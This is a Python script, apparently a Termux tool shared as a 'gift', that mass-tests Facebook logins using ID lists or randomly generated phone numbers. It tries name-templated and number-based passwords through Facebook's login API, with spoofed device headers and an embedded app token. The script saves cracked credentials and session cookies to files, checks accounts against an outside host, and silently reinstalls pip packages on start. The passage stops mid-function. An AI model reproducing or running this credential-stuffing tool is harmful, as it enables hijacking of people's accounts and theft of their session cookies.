"""
---> WRITTEN BY NOOR〤IMRAN <---
--->          600 MEMBER GIFT          <---
---> CREATE TIME: 1 APRIL 2025  <---
---> LAST UPDATE: 5 APRIL 2025  <---
"""
#-_-_-_-_-_-_-_-<-MODULE->-_-_-_-_-_-_-_-#
import os,random,time,string,sys,uuid,json
from pip._vendor import requests
from os import system
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#-_-_-_-_-_-_-_-<-INSTALL->-_-_-_-_-_-_-_-#
system("pkg uninstall python -y;pkg install python-pip -y;pip uninstall pycurl requests chardet urllib3 idna certifi -y > /dev/null;pip install pycurl chardet urllib3 idna certifi requests > /dev/null")
system('clear')
#-_-_-_-_-_-_-_-<-COLOR->-_-_-_-_-_-_-_-#
G="\033[1;92m"
W="\x1b[38;5;15m"
B="\033[1;34m"
Y="\x1b[38;5;226m"
A="\x1b[38;5;123m"
R="\33[1;91m"
O="\x1b[38;5;81m"
X="\x1b[38;5;205m"
P="\x1b[10;95m"
#-_-_-_-_-_-_-_-<-STYLE->-_-_-_-_-_-_-_-#
vb = f"{W}>{G}×{W}<"
vb1 = f"{W}>{G}1{W}<"
vb2 = f"{W}>{G}2{W}<"
vb3 = f"{W}>{G}3{W}<"
vb0 = f"{W}>{G}0{W}<"
vbv = f"{W}>{G}?{W}<"
vcv = f"{W}>{G}>{W}>"
#-_-_-_-_-_-_-_-<-CLEAR->-_-_-_-_-_-_-_-#
def clear():
	system("clear")
	print(logo)
#-_-_-_-_-_-_-_-<-LINE->-_-_-_-_-_-_-_-#
def linex():
	print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#-_-_-_-_-_-_-_-<-SIM-CODE->-_-_-_-_-_-_-_-#
_C_o_D_e_ = f"{vb} EXAMPLE   {vcv} 016 {G}/{W} 017 {G}/{W} 018 {G}/{W} 019"
#-_-_-_-_-_-_-_-<-LIMIT->-_-_-_-_-_-_-_-#
_L_i_M_i_T_= f"{vb} EXAMPLE   {vcv} 6666 {G}/{W} 7777 {G}/{W} 8888 {G}/{W} 9999"
#-_-_-_-_-_-_-_-<-METHOD->-_-_-_-_-_-_-_-#
_M_e_T_h_O_d_ = f"{vb1} METHOD {W}/{G}1-GRAPH{W}/\n{vb2} METHOD {W}/{G}2-API{W}/"
_M_e_T_h_O_dd_ = f"{vb1} METHOD {W}/{G}1-GRAPH{W}/\n{vb2} METHOD {W}/{G}2-B-GRAPH{W}/"
#-_-_-_-_-_-_-_-<-LOGO->-_-_-_-_-_-_-_-#
logo = (f"""
      {W}╔═╗╦╔═╗╔╦╗  ╔╗ ╦ ╦  ╔╗╔╔═╗╔═╗╦═╗
      {G}║ ╦║╠╣  ║   ╠╩╗╚╦╝  ║║║║ ║║ ║╠╦╝
      {W}╚═╝╩╚   ╩   ╚═╝ ╩   ╝╚╝╚═╝╚═╝╩╚═ V{G}/{W}GIFT
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{vb} DEVELOPER {vcv} NOOR{G}-{W}404
{vb} FEATURES  {vcv} RANDOM{G}〤{W}FILE{G}〤{W}OLD
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#-_-_-_-_-_-_-_-<-SELF->-_-_-_-_-_-_-_-#
class _G_i_F_t_:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.gen = []
        self.plist = []
#-_-_-_-_-_-_-_-<-MAIN-MENU->-_-_-_-_-_-_-_-#
    def _M_e_N_u_(self):
    	clear()
    	print(f"{vb1} RANDOM CLONING  | {vb3} OLD CLONING")
    	print(f"{vb2} FILE CLONING    | {vb0} EXIT TOOLS ")
    	linex()
    	_m_E_n_U_ = input(f"{vbv} INPUT MENU {vcv} ")
    	if _m_E_n_U_ == "1":
    	    self._R_a_N_d_O_m_()
    	if _m_E_n_U_ == "2":
    	    self._F_i_L_e_()
    	if _m_E_n_U_ == "3":
    	    self._O_i_D_()
    	if _m_E_n_U_ == "0":
    	    linex()
    	    print(f"{vb} SUCCESSFULLY EXIT DONE.....!")
    	if _m_E_n_U_ not in ["1","2","3","0"]:
        	linex()
        	print(f"{vb} INVALID OPTION TRY AGAIN......!")
        	time.sleep(1.5)
        	self._M_e_N_u_()
#-_-_-_-_-_-_-_-<-FILE-MENU->-_-_-_-_-_-_-_-#
    def _F_i_L_e_(self):
    	clear()
    	print(f"{vb} EXAMPLE   {vcv}{G} /{W}sdcard{G}/{W}GIFT{G}.{W}txt ")
    	linex()
    	_F_i_L_e_C_ = input(f"{vbv} INPUT FILE PATH {vcv} ")
    	try:
    	    _F_i_L_e_K_ = open(_F_i_L_e_C_,'r').read().splitlines()
    	except FileNotFoundError:
    	    linex()
    	    print(f"{vb} FILE NOT FOUND TRY AGAIN......!")
    	    time.sleep(1.5)
    	    self._F_i_L_e_()
    	clear()
    	print(_M_e_T_h_O_d_)
    	linex()
    	_f_I_l_e_M_e_T_h_O_d_ = input(f"{vbv} INPUT METHOD {vcv} ")
    	clear()
    	print(f"{vb1} AUTO BANGLADESH PASSLIST ")
    	print(f"{vb2} AUTO INDIA PASSLIST ")
    	print(f"{vb3} CUSTOM PASSLIST ")
    	linex()
    	_P_a_S_ = input(f"{vbv} INPUT PASSLIST {vcv} ")
    	if _P_a_S_ == "1":
    	    self.plist.append("first2025")
    	    self.plist.append("first123")
    	    self.plist.append("first@12345")
    	    self.plist.append("000999")
    	    self.plist.append("@first@")
    	    self.plist.append("firstlast1234")
    	    self.plist.append("first321")
    	    self.plist.append("firstlast")
    	    self.plist.append("first")
    	    self.plist.append("first12")
    	    self.plist.append("firstlast123")
    	    self.plist.append("123412")
    	    self.plist.append("0987654")
    	    self.plist.append("@1234@")
    	    self.plist.append("09876543")
    	    self.plist.append("@@@@####")
    	    self.plist.append("@@@###")
    	    self.plist.append("@123456@")
    	    self.plist.append("@12345678@")
    	    self.plist.append("first4321")
    	if _P_a_S_ == "2":
    	    self.plist.append('57273200')
    	    self.plist.append('59039200')
    	    self.plist.append('57575751')
    	    self.plist.append('07860786')
    	if _P_a_S_ not in ["1","2"]:
    	    try:
    	        clear()
    	        print(f"{vb} BANGLADESH PASSLIST 10{G}/{W}15 LIMIT")
    	        print(f"{vb} OTHERS COUNTRY PASSLIST 5{G}/{W}10 LIMIT")
    	        linex()
    	        _P_a_S_l_i_ = int(input(f"{vbv} PASSWORD LIMIT {vcv} "))
    	    except:
    	        _P_a_S_l_i_ = 5
    	    clear()
    	    print(f"{vb} EXAMPLE   {vcv} firstlast {G}/{W} first12 {G}/{W} first123 ")
    	    linex()
    	    for i in range(_P_a_S_l_i_):
    	        self.plist.append(input(f"{vb} ENTER PASSLIST {G}/{W}{i+1}{G}/ {vcv} "))
    	with ThreadPool(max_workers=30) as __FI__:
    	    clear()
    	    total_ids = str(len(_F_i_L_e_K_))
    	    print(f"{vb} TOTAL IDS {vcv} {total_ids} ")
    	    print(f"{vb} IF NO RESULT TURN ON{G}/{W}OFF APN MODE EVERY 5 MIN")
    	    linex()
    	    for user in _F_i_L_e_K_:
    	        ids,names = user.split('|')
    	        passlist = self.plist
    	        if _f_I_l_e_M_e_T_h_O_d_ == "1":
    	            __FI__.submit(self._M_1_X_,ids,names,passlist)
    	        if _f_I_l_e_M_e_T_h_O_d_ == "2":
    	            __FI__.submit(self._M_2_X_,ids,names,passlist)
    	        if _f_I_l_e_M_e_T_h_O_d_ not in ["1","2"]:
    	            __FI__.submit(self._M_1_X_,ids,names,passlist)
    	print("\033[1;37m")
    	linex()
    	print(f"{vb} THE PROCESS HAS COMPLETED...!")
    	print(f"{vb} TOTAL OK/CP {vcv}{B} "+str(len(self.oks))+f"{G}/{Y}"+str(len(self.cps)))
    	linex()
    	print(f"{vb} THANKS FOR USING.....! ")
    	sys.exit()
#-_-_-_-_-_-_-_-<-FILE-M1->-_-_-_-_-_-_-_-#
    def _M_1_X_(self,ids,names,passlist):
    	try:
    	    global loop,oks,cps
    	    coloor = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    	    sys.stdout.write(f"\r\r{vb}{G}/{W}>{coloor}GIFT-F1{W}<{G}/{W}>{coloor}{self.loop}{W}<{G}/{W}>{B}{len(self.oks)}{W}<{G}/{W}>{Y}{len(self.cps)}{W}< ")
    	    sys.stdout.flush()
    	    fn = names.split(' ')[0]
    	    try:
                ln = names.split(' ')[1]
    	    except:
                ln = fn
    	    for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                family = str(uuid.uuid4())
                advertiser_id = str(uuid.uuid4())
                data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'cpl': 'true',
                'family_device_id': family,
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': ids,
                'password': pas,
                'access_token': accessToken,
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': advertiser_id,
                'currently_logged_in_userid': '0',
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'}
                headers = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                url = 'https://graph.facebook.com/auth/login'
                po = requests.post(url,data=data,headers=headers).json()
                if "session_key" in po:
                    ids = str(po['uid'])
                    cookies = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print(f"\r\r{vb}{G}/{W}>{B}NOOR-OK{W}< {vcv}{B} "+ids+f"{G} / {B}"+pas+"\033[1;97m")
                    print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                    linex()
                    open('/sdcard/GIFT-BY-NOOR-FILE-M1-OK.txt','a').write(ids+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f"\r\r{vb}{G}/{W}>{Y}NOOR-CP{W}< {vcv}{Y} "+ids+f"{G} / {Y}"+pas+"\033[1;97m")
                    linex()
                    open('/sdcard/GIFT-BY-NOOR-FILE-M1-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
    	    self.loop += 1
    	except Exception as e:
            pass
#-_-_-_-_-_-_-_-<-FILE-M2->-_-_-_-_-_-_-_-#
    def _M_2_X_(self,ids,names,passlist):
    	try:
    	    global loop,oks,cps
    	    coloor = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    	    sys.stdout.write(f"\r\r{vb}{G}/{W}>{coloor}GIFT-F2{W}<{G}/{W}>{coloor}{self.loop}{W}<{G}/{W}>{B}{len(self.oks)}{W}<{G}/{W}>{Y}{len(self.cps)}{W}< ")
    	    sys.stdout.flush()
    	    fn = names.split(' ')[0]
    	    try:
                ln = names.split(' ')[1]
    	    except:
                ln = fn
    	    for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957647;FBDM/{density=2.0,width=720,height=1406};FBLC/ru_RU;FBRV/334763932;FBCR/MTS RUS;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1906;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data={
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email':ids,
                'password':pas,
                'access_token':accessToken,
                'generate_session_cookies':'1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'}
                headers = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                url = 'https://api.facebook.com/auth/login'
                po = requests.post(url,data=data,headers=headers).json()
                if "session_key" in po:
                    ids = str(po['uid'])
                    cookies = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print(f"\r\r{vb}{G}/{W}>{B}NOOR-OK{W}< {vcv}{B} "+ids+f"{G} / {B}"+pas+"\033[1;97m")
                    print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                    linex()
                    open('/sdcard/GIFT-BY-NOOR-FILE-M2-OK.txt','a').write(ids+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f"\r\r{vb}{G}/{W}>{Y}NOOR-CP{W}< {vcv}{Y} "+ids+f"{G} / {Y}"+pas+"\033[1;97m")
                    linex()
                    open('/sdcard/GIFT-BY-NOOR-FILE-M2-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
    	    self.loop += 1
    	except Exception as e:
            pass
#-_-_-_-_-_-_-_-<-RANDOM-MENU->-_-_-_-_-_-_-_-#
    def _R_a_N_d_O_m_(self):
    	clear()
    	print(_C_o_D_e_)
    	linex()
    	_r_A_n_S_i_M_ = input(f"{vbv} INPUT SIM CODE {vcv} ")
    	clear()
    	print(_L_i_M_i_T_)
    	linex()
    	_r_A_n_L_i_M_i_T_ = int(input(f"{vbv} INPUT LIMIT {vcv} "))
    	clear()
    	print(_M_e_T_h_O_dd_)
    	linex()
    	_r_A_n_M_e_T_h_O_d_ = input(f"{vbv} INPUT METHOD {vcv} ")
    	for x in range(_r_A_n_L_i_M_i_T_):
        	nmp = ''.join(random.choice(string.digits) for _ in range(8))
        	self.gen.append(nmp)
    	with ThreadPool(max_workers=30) as __RA__:
    	    clear()
    	    print(f"{vb} SIM CODE  {vcv} {_r_A_n_S_i_M_} ")
    	    print(f"{vb} TOTAL IDS {vcv} {_r_A_n_L_i_M_i_T_} ")
    	    print(f"{vb} IF NO RESULT TURN ON{G}/{W}OFF APN MODE EVERY 5 MIN")
    	    linex()
    	    for love in self.gen:
    	        ids = _r_A_n_S_i_M_ + love
    	        passlist = [ids,ids[:8],ids[:7],ids[:6],love,love[1:],love[2:]]
    	        if _r_A_n_M_e_T_h_O_d_ == "1":
    	            __RA__.submit(self._M_1_,ids,passlist)
    	        if _r_A_n_M_e_T_h_O_d_ == "2":
    	            __RA__.submit(self._M_2_,ids,passlist)
    	        if _r_A_n_M_e_T_h_O_d_ not in ["1","2"]:
    	            __RA__.submit(self._M_1_,ids,passlist)
    	print("\033[1;37m")
    	linex()
    	print(f"{vb} THE PROCESS HAS COMPLETED...!")
    	print(f"{vb} TOTAL OK/CP {vcv}{B} "+str(len(self.oks))+f"{G}/{Y}"+str(len(self.cps)))
    	linex()
    	print(f"{vb} THANKS FOR USING.....! ")
    	sys.exit()
#-_-_-_-_-_-_-_-<-RANDOM-M1->-_-_-_-_-_-_-_-#
    def _M_1_(self,ids,passlist):
    	global loop,oks,cps
    	coloor = random.choice(["\x1b[38;5;1m","\x1b[38;5;2m","\x1b[38;5;3m","\x1b[38;5;4m","\x1b[38;5;5m","\x1b[38;5;6m","\x1b[38;5;7m","\x1b[38;5;8m","\x1b[38;5;9m","\x1b[38;5;10m","\x1b[38;5;11m","\x1b[38;5;12m","\x1b[38;5;13m","\x1b[38;5;14m","\x1b[38;5;15m","\x1b[38;5;16m","\x1b[38;5;17m","\x1b[38;5;18m","\x1b[38;5;19m","\x1b[38;5;20m","\x1b[38;5;21m","\x1b[38;5;22m","\x1b[38;5;23m","\x1b[38;5;24m","\x1b[38;5;25m","\x1b[38;5;26m","\x1b[38;5;27m","\x1b[38;5;28m","\x1b[38;5;29m","\x1b[38;5;30m","\x1b[38;5;31m","\x1b[38;5;32m","\x1b[38;5;33m","\x1b[38;5;34m","\x1b[38;5;35m","\x1b[38;5;36m","\x1b[38;5;37m","\x1b[38;5;38m","\x1b[38;5;39m","\x1b[38;5;40m","\x1b[38;5;41m","\x1b[38;5;42m","\x1b[38;5;43m","\x1b[38;5;44m","\x1b[38;5;45m","\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;50m","\x1b[38;5;51m","\x1b[38;5;52m","\x1b[38;5;53m","\x1b[38;5;54m","\x1b[38;5;55m","\x1b[38;5;56m","\x1b[38;5;57m","\x1b[38;5;58m","\x1b[38;5;59m","\x1b[38;5;60m","\x1b[38;5;61m","\x1b[38;5;62m","\x1b[38;5;63m","\x1b[38;5;64m","\x1b[38;5;65m","\x1b[38;5;66m","\x1b[38;5;67m","\x1b[38;5;68m","\x1b[38;5;69m","\x1b[38;5;70m","\x1b[38;5;71m","\x1b[38;5;72m","\x1b[38;5;73m","\x1b[38;5;74m","\x1b[38;5;75m","\x1b[38;5;76m","\x1b[38;5;77m","\x1b[38;5;78m","\x1b[38;5;79m","\x1b[38;5;80m","\x1b[38;5;81m","\x1b[38;5;82m","\x1b[38;5;83m","\x1b[38;5;84m","\x1b[38;5;85m","\x1b[38;5;86m","\x1b[38;5;87m","\x1b[38;5;88m","\x1b[38;5;89m","\x1b[38;5;90m","\x1b[38;5;91m","\x1b[38;5;92m","\x1b[38;5;93m","\x1b[38;5;94m","\x1b[38;5;95m","\x1b[38;5;96m","\x1b[38;5;97m","\x1b[38;5;98m","\x1b[38;5;99m"])
    	sys.stdout.write(f"\r\r{vb}{G}/{W}>{coloor}GIFT-R1{W}<{G}/{W}>{coloor}{self.loop}{W}<{G}/{W}>{B}{len(self.oks)}{W}<{G}/{W}>{Y}{len(self.cps)}{W}< ")
    	sys.stdout.flush()
    	try:
            for pas in passlist:
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data = {
                'adid':adid,
                'format':'json',
                'device_id':device_id,
                'email':ids,
                'password':pas,
                'generate_analytics_claims':'1',
                'community_id':'',
                'cpl':'true',
                'try_num':'1',
                'family_device_id':str(uuid.uuid4()),
                'credentials_type':'password',
                'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'currently_logged_in_userid':'0',
                'locale':'en_US',
                'client_country_code':'US',
                'fb_api_req_friendly_name':'authenticate',
                'api_key':'882a8490361da98702bf97a021ddc14d',
                'access_token':accessToken,}
                headers = {
                'User-Agent':self.__UPX__(),
                'Accept-Encoding':'gzip, deflate',
                'Connection':'close',
                'Content-Type':'application/x-www-form-urlencoded',
                'Host':'graph.facebook.com',
                'X-FB-Net-HNI':str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI':str(random.randint(20000, 40000)),
                'Authorization':f'OAuth {accessToken}',
                'X-FB-Connection-Type':'MOBILE.LTE',
                'X-Tigon-Is-Retry':'False',
                'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group':'5120',
                'X-FB-Friendly-Name':'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags':'graphservice',
                'X-FB-HTTP-Engine':'Liger',
                'X-FB-Client-IP':'True',
                'X-FB-Server-Cluster':'True',
                'x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
                url = 'https://graph.facebook.com/auth/login'
                po = requests.post(url,data=data,headers=headers).json()
                if "session_key" in po:
                    uid = po['uid']
                    cookies = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    response = str(requests.get(f"https://shajon404.pythonanywhere.com/live?uid={uid}").text)
                    if "Live" in response:
                        print(f"\r\r{vb}{G}/{W}>{B}NOOR-OK{W}< {vcv}{B} {str(uid)} {G}/{B} {pas}")
                        print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                        linex()
                        open('/sdcard/GIFT-BY-NOOR-RANDOM-M1-OK.txt','a').write(str(uid)+'/'+pas+'/'+cookies+'\n')
                        self.oks.append(str(uid))
                        break
                elif 'www.facebook.com' in po['error']['message']:
                    uid = po['error']['error_data']['uid']
                    print(f"\r\r{vb}{G}/{W}>{Y}NOOR-CP{W}< {vcv}{Y} {str(uid)} {G}/{Y} {pas}")
                    linex()
                    open('/sdcard/GIFT-BY-NOOR-RANDOM-M1-CP.txt','a').write(str(uid)+'/'+pas+'\n')
                    self.cps.append(str(uid))
                    break
                else:continue
            self.loop += 1
    	except Exception as e:
            pass
#-_-_-_-_-_-_-_-<-RANDOM-M2->-_-_-_-_-_-_-_-#
    def _M_2_(self,ids,passlist):
    	global loop,oks,cps
    	coloor = random.choice(["\x1b[38;5;1m","\x1b[38;5;2m","\x1b[38;5;3m","\x1b[38;5;4m","\x1b[38;5;5m","\x1b[38;5;6m","\x1b[38;5;7m","\x1b[38;5;8m","\x1b[38;5;9m","\x1b[38;5;10m","\x1b[38;5;11m","\x1b[38;5;12m","\x1b[38;5;13m","\x1b[38;5;14m","\x1b[38;5;15m","\x1b[38;5;16m","\x1b[38;5;17m","\x1b[38;5;18m","\x1b[38;5;19m","\x1b[38;5;20m","\x1b[38;5;21m","\x1b[38;5;22m","\x1b[38;5;23m","\x1b[38;5;24m","\x1b[38;5;25m","\x1b[38;5;26m","\x1b[38;5;27m","\x1b[38;5;28m","\x1b[38;5;29m","\x1b[38;5;30m","\x1b[38;5;31m","\x1b[38;5;32m","\x1b[38;5;33m","\x1b[38;5;34m","\x1b[38;5;35m","\x1b[38;5;36m","\x1b[38;5;37m","\x1b[38;5;38m","\x1b[38;5;39m","\x1b[38;5;40m","\x1b[38;5;41m","\x1b[38;5;42m","\x1b[38;5;43m","\x1b[38;5;44m","\x1b[38;5;45m","\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;50m","\x1b[38;5;51m","\x1b[38;5;52m","\x1b[38;5;53m","\x1b[38;5;54m","\x1b[38;5;55m","\x1b[38;5;56m","\x1b[38;5;57m","\x1b[38;5;58m","\x1b[38;5;59m","\x1b[38;5;60m","\x1b[38;5;61m","\x1b[38;5;62m","\x1b[38;5;63m","\x1b[38;5;64m","\x1b[38;5;65m","\x1b[38;5;66m","\x1b[38;5;67m","\x1b[38;5;68m","\x1b[38;5;69m","\x1b[38;5;70m","\x1b[38;5;71m","\x1b[38;5;72m","\x1b[38;5;73m","\x1b[38;5;74m","\x1b[38;5;75m","\x1b[38;5;76m","\x1b[38;5;77m","\x1b[38;5;78m","\x1b[38;5;79m","\x1b[38;5;80m","\x1b[38;5;81m","\x1b[38;5;82m","\x1b[38;5;83m","\x1b[38;5;84m","\x1b[38;5;85m","\x1b[38;5;86m","\x1b[38;5;87m","\x1b[38;5;88m","\x1b[38;5;89m","\x1b[38;5;90m","\x1b[38;5;91m","\x1b[38;5;92m","\x1b[38;5;93m","\x1b[38;5;94m","\x1b[38;5;95m","\x1b[38;5;96m","\x1b[38;5;97m","\x1b[38;5;98m","\x1b[38;5;99m"])
    	sys.stdout.write(f"\r\r{vb}{G}/{W}>{coloor}GIFT-R2{W}<{G}/{W}>{coloor}{self.loop}{W}<{G}/{W}>{B}{len(self.oks)}{W}<{G}/{W}>{Y}{len(self.cps)}{W}< ")
    	sys.stdout.flush()
    	try:
            for pas in passlist:
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data = {
                'adid':adid,
                'format':'json',
                'device_id':device_id,
                'email':ids,
                'password':pas,
                'generate_analytics_claims':'1',
                'community_id':'',
                'cpl':'true',
                'try_num':'1',
                'family_device_id':str(uuid.uuid4()),
                'credentials_type':'password',
                'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'currently_logged_in_userid':'0',
                'locale':'en_GB',
                'client_country_code':'GB',
                'fb_api_req_friendly_name':'authenticate'}
                headers={
                'User-Agent':self.__UPX__(),
                'Accept-Encoding':'gzip,deflate',
                'Accept':'*/*',
                'Connection':'keep-alive',
                'Authorization':f'OAuth {accessToken}',
                'X-FB-Friendly-Name':'authenticate',
                'X-FB-Connection-Bandwidth':str(random.randint(20000,40000)),
                'X-FB-Net-HNI':str(random.randint(20000,40000)),
                'X-FB-SIM-HNI':str(random.randint(20000,40000)),
                'X-FB-Connection-Type':'unknown',
                'Content-Type':'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine':'Liger'}
                url = 'https://b-graph.facebook.com/auth/login'
                po = requests.post(url,data=data,headers=headers).json()
                if "session_key" in po:
                    uid = po['uid']
                    cookies = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    response = str(requests.get(f"https://shajon404.pythonanywhere.com/live?uid={uid}").text)
                    if "Live" in response:
                        print(f"\r\r{vb}{G}/{W}>{B}NOOR-OK{W}< {vcv}{B} {str(uid)} {G}/{B} {pas}")
                        print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                        linex()
                        open('/sdcard/GIFT-BY-NOOR-RANDOM-M2-OK.txt','a').write(str(uid)+'/'+pas+'/'+cookies+'\n')
                        self.oks.append(str(uid))
                        break
                elif 'www.facebook.com' in po['error']['message']:
                    uid = po['error']['error_data']['uid']
                    print(f"\r\r{vb}{G}/{W}>{Y}NOOR-CP{W}< {vcv}{Y} {str(uid)} {G}/{Y} {pas}")
                    linex()
                    open('/sdcard/GIFT-BY-NOOR-RANDOM-M2-CP.txt','a').write(str(uid)+'/'+pas+'\n')
                    self.cps.append(str(uid))
                    break
                else:continue
            self.loop += 1
    	except Exception as e:
            pass
#-_-_-_-_-_-_-_-<-OLD-MENU->-_-_-_-_-_-_-_-#
    def _O_i_D_(self):
    	clear()
    	print(_L_i_M_i_T_)
    	linex()
    	_o_L_d_L_i_M_i_T_ = int(input(f"{vbv} INPUT LIMIT {vcv} "))
    	_Y_e_A_r_ = '10000'
    	for i in range(_o_L_d_L_i_M_i_T_):
    	    nmp = str(random.choice(range(1000000000,1999999999)))
    	    self.gen.append(nmp)
    	with ThreadPool(max_workers=30) as __OL__:
    	    total_ids = _o_L_d_L_i_M_i_T_
    	    clear()
